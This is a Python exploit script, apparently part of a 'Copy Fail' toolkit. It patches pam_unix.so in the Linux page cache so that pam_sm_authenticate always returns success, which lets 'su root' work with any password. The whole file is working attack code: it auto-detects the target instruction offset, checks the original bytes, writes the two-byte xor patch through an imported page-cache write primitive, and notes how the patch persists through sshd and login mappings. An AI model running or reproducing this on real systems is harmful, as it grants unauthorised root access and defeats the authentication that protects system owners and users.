#!/usr/bin/env python3
"""
Copy Fail — PAM authentication bypass
=======================================
Patches pam_unix.so in page cache to force pam_sm_authenticate()
to always return PAM_SUCCESS, allowing `su root` with any password.

Technique: replace `mov %eax,%ebp` (89 c5) with `xor %ebp,%ebp` (31 ed)
at the return-value save point after the password verification call.
This zeroes the return code (PAM_SUCCESS = 0) regardless of actual result.

The exact offset varies by pam_unix.so version — use the helper below
or determine it manually via: objdump -d pam_unix.so | grep -A2 'pam_sm_auth'

Tested on: CentOS Stream 8, pam-1.3.1-33.el8 (pam_unix.so 58096 bytes)
"""
import os
import sys
import subprocess
from copyfail_core import page_cache_write_4bytes

PAM_SO = "/usr/lib64/security/pam_unix.so"
if not os.path.exists(PAM_SO):
    PAM_SO = "/lib/x86_64-linux-gnu/security/pam_unix.so"


def find_patch_offset(path):
    """
    Locate the `mov %eax,%ebp` (89 c5) instruction after the password
    verification callq inside pam_sm_authenticate.

    Returns (offset, original_bytes) or None.
    """
    try:
        out = subprocess.check_output(
            ["objdump", "-d", path], text=True, stderr=subprocess.DEVNULL
        )
    except FileNotFoundError:
        print("[-] objdump not available; specify offset manually")
        return None

    in_func = False
    after_call = False
    for line in out.splitlines():
        if "<pam_sm_authenticate" in line and not in_func:
            in_func = True
            continue
        if not in_func:
            continue
        # End of function (next symbol or empty line after prologue)
        if line and not line.startswith(" ") and ":" in line and "<" in line:
            if "pam_sm_authenticate" not in line:
                break

        stripped = line.strip()
        if "callq" in stripped or "call" in stripped:
            after_call = True
            continue
        if after_call and "89 c5" in stripped and "mov" in stripped and "%eax,%ebp" in stripped:
            addr_str = stripped.split(":")[0].strip()
            addr = int(addr_str, 16)
            return addr
        if after_call and ("test" in stripped or "cmp" in stripped):
            after_call = False

    return None


def main():
    if not os.path.isfile(PAM_SO):
        print(f"[-] {PAM_SO} not found")
        sys.exit(1)

    offset = find_patch_offset(PAM_SO)
    if offset is None:
        if len(sys.argv) > 1:
            offset = int(sys.argv[1], 0)
            print(f"[*] Using manual offset: 0x{offset:x}")
        else:
            print("[-] Could not auto-detect patch offset")
            print("[*] Usage: python3 exp_pam_bypass.py 0x3d5e")
            sys.exit(1)
    else:
        print(f"[*] Auto-detected patch offset: 0x{offset:x}")

    fd = os.open(PAM_SO, os.O_RDONLY)

    # Verify current bytes
    os.lseek(fd, offset, os.SEEK_SET)
    current = os.read(fd, 4)
    print(f"[*] Current bytes at 0x{offset:x}: {current.hex()}")

    if current[:2] != b'\x89\xc5':
        print(f"[!] Expected 89 c5 (mov %%eax,%%ebp), got {current[:2].hex()}")
        print("[!] Wrong offset or different pam_unix.so version")
        os.close(fd)
        sys.exit(1)

    # Patch: mov %eax,%ebp (89 c5) → xor %ebp,%ebp (31 ed)
    # Preserve the 2 bytes after the patch point
    patch = b'\x31\xed' + current[2:4]
    print(f"[*] Patching to: {patch.hex()} (xor %%ebp,%%ebp + original trail)")

    page_cache_write_4bytes(fd, offset, patch)

    # Verify
    os.lseek(fd, offset, os.SEEK_SET)
    result = os.read(fd, 4)
    os.close(fd)

    if result[:2] == b'\x31\xed':
        print(f"[+] SUCCESS: pam_unix.so patched in page cache")
        print(f"[*] Verify: su root (any password should work)")
        print(f"[*] Note: mmap references from sshd/login keep this alive across drop_caches")
        print(f"[*] Restore: yum reinstall pam / apt reinstall libpam-modules")
    else:
        print(f"[-] FAILED: read back {result.hex()}")


if __name__ == "__main__":
    main()
